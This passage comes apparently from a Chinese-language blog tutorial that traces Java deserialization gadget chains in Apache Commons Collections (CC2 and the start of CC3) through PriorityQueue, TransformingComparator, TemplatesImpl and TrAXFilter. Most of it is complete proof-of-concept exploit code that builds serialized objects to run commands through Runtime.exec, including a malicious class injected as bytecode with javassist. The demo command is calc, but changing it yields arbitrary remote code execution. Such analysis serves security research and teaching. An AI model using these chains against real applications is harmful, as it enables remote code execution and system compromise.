unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p>下面是全新的链子：</p><p>首先<code>chainedTransformer</code>类获取Runtime.getRuntime.exec是和前面的一样的，这里就不再分析了</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;    new ConstantTransformer(Class.class),    new InvokerTransformer(        &quot;forName&quot;,        new Class[] &#123;String.class&#125;,        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;    ),    new InvokerTransformer(        &quot;getMethod&quot;,        new Class[] &#123;String.class,Class[].class&#125;,        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;    ),    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;        Object.class, Object[].class &#125;, new Object[] &#123;        null, new Object[0] &#125;),    new InvokerTransformer(        &quot;exec&quot;,        new Class[] &#123;String.class&#125;,        new String[]&#123;&quot;calc&quot;&#125;    )&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(&#39;s&#39;);</code></pre><h3 id="TransformingComparator版本"><a href="#TransformingComparator版本" class="headerlink" title="TransformingComparator版本"></a>TransformingComparator版本</h3><p>下一步是找一个调用了<code>transform</code>的方法</p><p>在<code>org.apache.commons.collections4.comparators.TransformingComparator</code>这个类中</p><pre><code class="java">public int compare(final I obj1, final I obj2) &#123;    final O value1 = this.transformer.transform(obj1);    final O value2 = this.transformer.transform(obj2);    return this.decorated.compare(value1, value2);&#125;</code></pre><p>this.transformer是由构造函数赋值：</p><pre><code class="java">public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,                              final Comparator&lt;O&gt; decorated) &#123;    this.decorated = decorated;    this.transformer = transformer;&#125;</code></pre><p>目前构造的poc:因为compare中调用了两次<code>transform</code>,所以会执行两次命令</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;    new ConstantTransformer(Class.class),    new InvokerTransformer(        &quot;forName&quot;,        new Class[] &#123;String.class&#125;,        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;    ),    new InvokerTransformer(        &quot;getMethod&quot;,        new Class[] &#123;String.class,Class[].class&#125;,        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;    ),    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;        Object.class, Object[].class &#125;, new Object[] &#123;        null, new Object[0] &#125;),    new InvokerTransformer(        &quot;exec&quot;,        new Class[] &#123;String.class&#125;,        new String[]&#123;&quot;calc&quot;&#125;    )&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(chainedTransformer,null);transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);</code></pre><p>下一步就是寻找哪里调用了compare方法，然后找到<code>java.util.PriorityQueue</code></p><pre><code class="java">private void siftUpUsingComparator(int k, E x) &#123;        while (k &gt; 0) &#123;            int parent = (k - 1) &gt;&gt;&gt; 1;            Object e = queue[parent];            if (comparator.compare(x, (E) e) &gt;= 0)                break;            queue[k] = e;            k = parent;        &#125;        queue[k] = x;    &#125;private void siftDownUsingComparator(int k, E x) &#123;        int half = size &gt;&gt;&gt; 1;        while (k &lt; half) &#123;            int child = (k &lt;&lt; 1) + 1;            Object c = queue[child];            int right = child + 1;            if (right &lt; size &amp;&amp;                comparator.compare((E) c, (E) queue[right]) &gt; 0)                c = queue[child = right];            if (comparator.compare(x, (E) c) &lt;= 0)                break;            queue[k] = c;            k = child;        &#125;        queue[k] = x;    &#125;</code></pre><p>这里的两个方法的if语句中调用了<code>compare</code>方法，但是这些方法是<code>private</code>类型的，不能直接调用，找到这类中调用这个方法的方法</p><pre><code class="java">private void siftUp(int k, E x) &#123;        if (comparator != null)            siftUpUsingComparator(k, x);        else            siftUpComparable(k, x);    &#125;private void siftDown(int k, E x) &#123;        if (comparator != null)            siftDownUsingComparator(k, x);        else            siftDownComparable(k, x);    &#125;</code></pre><p>这个<code>comparator</code>属性不为空则调用<code>siftUpUsingComparator</code>或<code>siftDownUsingComparator</code>,但是这两个还是<code>private</code>类型的，进行往上查找</p><p>找到offer()方法,需要i&gt;&#x3D;1才能调用siftUp(),这里的i是PriorityQueue队列长度，然后还找到了add()方法调用了offer()</p><pre><code class="java">public boolean offer(E e) &#123;        if (e == null)            throw new NullPointerException();        modCount++;        int i = size;        if (i &gt;= queue.length)            grow(i + 1);        size = i + 1;        if (i == 0)            queue[0] = e;        else            siftUp(i, e);        return true;    &#125;public boolean add(E e) &#123;        return offer(e);    &#125;</code></pre><p>那么现在的思路是</p><pre><code>add()-&gt;offer()-&gt;siftUp() -&gt; siftUpComparable()</code></pre><p>修改一下poc即可进行命令执行</p><pre><code class="java">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(chainedTransformer,null);//        transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);PriorityQueue queue = new PriorityQueue(2,transformingComparator);queue.add(1);queue.add(2);</code></pre><p>至于siftDown()方法,这里找到的是</p><pre><code class="java">private void heapify() &#123;        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)            siftDown(i, (E) queue[i]);    &#125;</code></pre><p>size &gt;&gt;&gt; 1这里表示右移一位即相当于除二，所以size最小为2，即队列大小为二</p><p>继续往上找,找到了<code>readObject</code></p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException &#123;        // Read in size, and any hidden stuff        s.defaultReadObject();        // Read in (and discard) array length        s.readInt();        queue = new Object[size];        // Read in all elements.        for (int i = 0; i &lt; size; i++)            queue[i] = s.readObject();        // Elements are guaranteed to be in &quot;proper order&quot;, but the        // spec has never explained what that might be.        heapify();    &#125;</code></pre><p>找到这里就可以结束这条链子了</p><p>利用链如下：</p><pre><code class="mermaid">graph TBA(&quot;java.util.PriorityQueue#\nreadObject()&quot;) --&gt; B(&quot;java.util.PriorityQueue#\nheapify()&quot;)B(&quot;java.util.PriorityQueue#\nheapify()&quot;)--&gt; C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)--&gt;D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)--&gt;E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)--&gt;F(&quot;org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()&quot;)F(&quot;org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()&quot;)--&gt;G(&quot;org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()&quot;)G(&quot;org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()&quot;)--&gt;H(&quot;Runtime.getRuntime.exec(&#39;calc&#39;)&quot;)</code></pre><p>最终POC如下：</p><pre><code class="java">package org.example;import org.apache.commons.collections4.*;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.util.PriorityQueue;import org.apache.commons.collections4.comparators.TransformingComparator;public class App&#123;    public static void main(String[] args ) throws IOException, ClassNotFoundException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(chainedTransformer,null);//        transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);        PriorityQueue queue = new PriorityQueue(2,transformingComparator);        queue.add(1);        queue.add(2);        serialize(queue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="TemplatesImpl版本"><a href="#TemplatesImpl版本" class="headerlink" title="TemplatesImpl版本"></a>TemplatesImpl版本</h3><p>在这个版本中使用的是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类的<code>defineTransletClasses()</code>方法</p><pre><code class="java">private void defineTransletClasses()        throws TransformerConfigurationException &#123;...     TransletClassLoader loader = (TransletClassLoader)            AccessController.doPrivileged(new PrivilegedAction() &#123;                public Object run() &#123;                    return new TransletClassLoader(ObjectFactory.findClassLoader());                &#125;            &#125;);        try &#123;            final int classCount = _bytecodes.length;            _class = new Class[classCount];            if (classCount &gt; 1) &#123;                _auxClasses = new Hashtable();            &#125;            for (int i = 0; i &lt; classCount; i++) &#123;                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();                // Check if this is the main class                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;                    _transletIndex = i;                &#125;                else &#123;                    _auxClasses.put(_class[i].getName(), _class[i]);                &#125;            &#125;...    &#125;</code></pre><p>这个方法会创建一个长度为<code>_bytecodes.length</code>的数组<code>_class</code>，然后循环遍历每个转换类的字节码，并通过<code>loader.defineClass(_bytecodes[i])</code>方法将字节码转换为实际的<code>Class</code>对象</p><p>如果<code>_bytecodes</code>保存的是恶意的字节码，那这里就可以获得一个恶意的Class对象</p><p>其中<code>_bytecodes</code>可以通过构造函数获取，但是这个是protected类型的，不能直接调用，为了不那么麻烦，可以考虑通过反射修改属性的值了</p><pre><code class="java">protected TemplatesImpl(byte[][] bytecodes, String transletName,        Properties outputProperties, int indentNumber,        TransformerFactoryImpl tfactory)    &#123;        _bytecodes = bytecodes;        init(transletName, outputProperties, indentNumber, tfactory);    &#125;</code></pre><p>通过反射修改属性的值:</p><pre><code class="java">TemplatesImpl tmpl = new TemplatesImpl();Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);</code></pre><p>如何获取恶意的bytes?</p><p>使用<code>javasist</code>创建恶意类，转换成<code>bytes</code>,然后使用ClassLoader进行加载测试</p><pre><code class="java">ClassPool pool = ClassPool.getDefault();CtClass Evil = pool.makeClass(&quot;Evil&quot;);Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));String name = &quot;Evil&quot;;Evil.setName(name);String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;CtConstructor constructor = Evil.makeClassInitializer();constructor.insertBefore(cmd);byte[] bytes =Evil.toBytecode();Evil.writeFile(&quot;./&quot;);//测试Class clas = Class.forName(&quot;java.lang.ClassLoader&quot;);Method defineclass = clas.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);defineclass.setAccessible(true);Class claz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;Evil&quot;,bytes,0,bytes.length);claz.newInstance();</code></pre><p>其中，第三行是设置这个恶意类继承<code>AbstractTranslet</code>,为什么要这么做呢？</p><p>因为上面提到的<code>defineTransletClasses</code>中，存在if检查,检查这个类的父类是否为<code>ABSTRACT_TRANSLET</code></p><pre><code class="java">for (int i = 0; i &lt; classCount; i++) &#123;                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();                // Check if this is the main class                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;                    _transletIndex = i;                &#125;                else &#123;                    _auxClasses.put(_class[i].getName(), _class[i]);                &#125;            &#125;</code></pre><pre><code class="java">private static String ABSTRACT_TRANSLET        = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</code></pre><p>目前的poc:</p><pre><code class="java">//构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);</code></pre><p>这里只是获取了恶意的Class,但是还没有进行实例化</p><p>查看在这个类下的<code>getTransletInstance</code>方法</p><pre><code class="java">private Translet getTransletInstance()        throws TransformerConfigurationException &#123;        try &#123;            if (_name == null) return null;            if (_class == null) defineTransletClasses();            // The translet needs to keep a reference to all its auxiliary            // class to prevent the GC from collecting them            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();            translet.postInitialization();            translet.setTemplates(this);            translet.setServicesMechnism(_useServicesMechanism);            translet.setAllowedProtocols(_accessExternalStylesheet);            if (_auxClasses != null) &#123;                translet.setAuxiliaryClasses(_auxClasses);            &#125;            return translet;        &#125;        catch (InstantiationException e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;        catch (IllegalAccessException e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;    &#125;</code></pre><p>在这个方法中，如果属性<code>_name</code>为空直接返回null,需要反射修改这个值如果_class 为空则调用刚刚的<code>defineTransletClasses()</code>，然后后面newInstance()会对<code>_class</code>的内容进行建类的实例，就是获取到这个恶意类的实例，执行恶意类</p><p>所以构造poc需要添加：</p><pre><code class="java">Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);_name.setAccessible(true);_name.set(tmpl,&quot;aaa&quot;);Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);_class.setAccessible(true);_class.set(tmpl,null);</code></pre><p>下一步是查看哪里调用了<code>getTransletInstance</code>,然后就找到了<code>newTransformer</code></p><pre><code class="java">public synchronized Transformer newTransformer()        throws TransformerConfigurationException    &#123;        TransformerImpl transformer;        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,            _indentNumber, _tfactory);        if (_uriResolver != null) &#123;            transformer.setURIResolver(_uriResolver);        &#125;        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;            transformer.setSecureProcessing(true);        &#125;        return transformer;    &#125;</code></pre><p>这个方法是public方法可以直接调用,然后就可以触发前面的链子执行命令了</p><pre><code class="java">tmpl.newTransformer();</code></pre><p>到这里还没有到readObject,继续寻找</p><p>注意看上面的newTransformer方法，它返回一个 <code>Transformer</code> 对象。这很关键</p><p>这里直接使用了前面链子中用到过的<code>InvokerTransformer</code>,这个可以调用任意方法</p><pre><code class="java">InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;,null,null);transformer.transform(tmpl);</code></pre><p>这样就可以代替<code>tmpl.newTransformer()</code>,而且还可以链到CC2第一条链子上(TransformingComparator版本)</p><p>后面的就不详细分析了，上面有</p><p>下一步就是调用到<code>org.apache.commons.collections4.comparators.TransformingComparator#compare()</code></p><pre><code class="java">public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer) &#123;        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);    &#125;public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,                                  final Comparator&lt;O&gt; decorated) &#123;        this.decorated = decorated;        this.transformer = transformer;    &#125;public int compare(final I obj1, final I obj2) &#123;        final O value1 = this.transformer.transform(obj1);        final O value2 = this.transformer.transform(obj2);        return this.decorated.compare(value1, value2);    &#125;</code></pre><p>所以使用</p><pre><code class="java">TransformingComparator transformingComparator = new TransformingComparator(transformer);transformingComparator.compare(tmpl,tmpl);</code></pre><p>替换<code>transformer.transform(tmpl);</code></p><p>下一步就是找调用<code>compare</code>的地方</p><p><code>java.util.PriorityQueue#siftDownUsingComparator()</code></p><pre><code class="java">private void siftDownUsingComparator(int k, E x) &#123;        int half = size &gt;&gt;&gt; 1;        while (k &lt; half) &#123;            int child = (k &lt;&lt; 1) + 1;            Object c = queue[child];            int right = child + 1;            if (right &lt; size &amp;&amp;                comparator.compare((E) c, (E) queue[right]) &gt; 0)                c = queue[child = right];            if (comparator.compare(x, (E) c) &lt;= 0)                break;            queue[k] = c;            k = child;        &#125;        queue[k] = x;    &#125;</code></pre><p>这里使用第二个<code>compare</code>来触发，毕竟它的参数<code>x</code>是直接来自方法的参数，而且<code>comparator</code>是类属性，可以通过反射修改为<code>transformingComparator</code></p><p>下一步就是看<code>siftDown</code></p><pre><code class="java">private void siftDown(int k, E x) &#123;        if (comparator != null)            siftDownUsingComparator(k, x);        else            siftDownComparable(k, x);    &#125;</code></pre><p>这里需要控制comparator !&#x3D; null，上面已经通过反射修改，不为空</p><p>然后就到了这里<code>heapify</code></p><pre><code class="java">private void heapify() &#123;    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)        siftDown(i, (E) queue[i]);&#125;</code></pre><p>这里需要注意一下我们需要控制的参数变成了<code>queue[i]</code>,这个queue是这个类的属性，可以通过反射修改</p><p>还有size &gt;&gt;&gt; 1这里表示右移一位即相当于除二，所以size最小为2,可以通过添加队列元素控制，也可以通过反射控制</p><p>然后就来到了这个类的<code>readObject</code></p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException &#123;        // Read in size, and any hidden stuff        s.defaultReadObject();        // Read in (and discard) array length        s.readInt();        queue = new Object[size];        // Read in all elements.        for (int i = 0; i &lt; size; i++)            queue[i] = s.readObject();        // Elements are guaranteed to be in &quot;proper order&quot;, but the        // spec has never explained what that might be.        heapify();    &#125;</code></pre><p>整个调用链：</p><pre><code class="mermaid">graph TBA(&quot;java.util.PriorityQueue#\nreadObject()&quot;) --&gt; B(&quot;java.util.PriorityQueue#\nheapify()&quot;)B(&quot;java.util.PriorityQueue#\nheapify()&quot;)--&gt; C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)--&gt;D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)--&gt;E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)--&gt;F(&quot;org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()&quot;)F(&quot;org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()&quot;)--&gt;G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;K(&quot;Runtime.getRuntime.exec&quot;)</code></pre><p>最终POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.Field;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import java.util.PriorityQueue;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class App&#123;    public static void main(String[] args ) throws IOException, NotFoundException, CannotCompileException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();        InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;,null,null);//        transformer.transform(tmpl);        TransformingComparator transformingComparator = new TransformingComparator(transformer);//        transformingComparator.compare(tmpl,tmpl);        PriorityQueue queue = new PriorityQueue(2);        queue.add(1);        queue.add(2);        Field comparator_field = queue.getClass().getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,transformingComparator);        Field queue_ = queue.getClass().getDeclaredField(&quot;queue&quot;);        queue_.setAccessible(true);        queue_.set(queue, new Object[]&#123;tmpl,1&#125;);        serialize(queue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>条件：commons-collections: 3.1～3.2.1</p><p>jdk： &lt;7u21或jdk8低版本</p><p>环境：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>这个条链子可以说是CC1和CC2的结合，前半部分是CC2的后半部分是CC1的</p><p>下面是前半部分的，就是上面CC2种javassist写入恶意字节码部分，这里就不分析了</p><pre><code class="java">//构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);        tmpl.newTransformer();//触发命令执行</code></pre><p>下一步就是寻找哪些地方可以调用<code>newTransformer()</code></p><p>这里使用的是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>这个类</p><pre><code class="java">public TrAXFilter(Templates templates)  throws        TransformerConfigurationException    &#123;        _templates = templates;        _transformer = (TransformerImpl) templates.newTransformer();        _transformerHandler = new TransformerHandlerImpl(_transformer);        _useServicesMechanism = _transformer.useServicesMechnism();    &#125;</code></pre><p>在这个类的构造方法种就调用了<code>newTransformer()</code>方法，<code>templates</code>参数可控</p><p>直接构造new TrAXFilter(tmpl);就能触发</p><p>下一步就是找到一个方法调用了<code>TrAXFilter</code>的构造方法</p><p>这里找到的是<code>org.apache.commons.collections.functors.InstantiateTransformer</code>的<code>transform</code>方法</p><pre><code class="java">public Object transform(Object input) &#123;        try &#123;            if (input instanceof Class == false) &#123;                throw new FunctorException(                    &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;                        + (input == null ? &quot;null object&quot; : input.getClass().getName()));            &#125;            Constructor con = ((Class) input).getConstructor(iParamTypes);            return con.newInstance(iArgs);        &#125; catch (NoSuchMethodException ex) &#123;            throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;);        &#125; catch (InstantiationException ex) &#123;            throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex);        &#125; catch (IllegalAccessException ex) &#123;            throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex);        &#125; catch (InvocationTargetException ex) &#123;            throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex);        &#125;    &#125;</code></pre><p>其构造方法如下：</p><pre><code class="java">public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123;        super();        iParamTypes = paramTypes;        iArgs = args;    &#125;</code></pre><p>这个iParamTypes可控，说明<code>Constructor con = ((Class) input).getConstructor(iParamTypes);</code>可控，这条语句的意思是，获取指定参数类型的构造方法，然后使用构造函数的<code>newInstance()</code>方法创建对象的实例。<code>iArgs</code>表示实际传递给构造函数的参数列表</p><p>所以构造下面代码就可以命令执行了：</p><pre><code class="java">InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);instantiateTransformer.transform(TrAXFilter.class);</code></pre><p>这里和CC1一样，因为这个<code>transform</code>还需要传入一个参数<code>TrAXFilter.class</code>，这对后面的利用中参数控制带来一定的麻烦</p><p>于是又用上了<code>ConstantTransformer</code>这个类</p><pre><code class="java">public ConstantTransformer(Object constantToReturn) &#123;        super();        iConstant = constantToReturn;    &#125;</code></pre><pre><code class="java">public Object transform(Object input) &#123;        return iConstant;    &#125;</code></pre><p>这个类的<code>transform</code>方法直接返回构造函数的参数</p><p>再利用<code>ChainedTransformer</code>将这两个类串起来：</p><pre><code class="java">Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;ChainedTransformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(&#39;a&#39;);</code></pre><p>然后后面的链子就是CC1的内容了:</p><p>找到一个调用了<code>transform</code>的类，按照CC1的就是LazyMap()这个类的get()</p><pre><code class="java">public static Map decorate(Map map, Transformer factory) &#123;        return new LazyMap(map, factory);    &#125;protected LazyMap(Map map, Transformer factory) &#123;        super(map);        if (factory == null) &#123;            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);        &#125;        this.factory = factory;    &#125;public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>所以将<code>transformerChain.transform(&#39;a&#39;);</code>替换成：</p><pre><code class="java">Map map = new HashMap();Map lazyMap = LazyMap.decorate(map,transformerChain);lazyMap.get(&quot;a&quot;);</code></pre><h3 id="AnnotationInvocationHandler版本"><a href="#AnnotationInvocationHandler版本" class="headerlink" 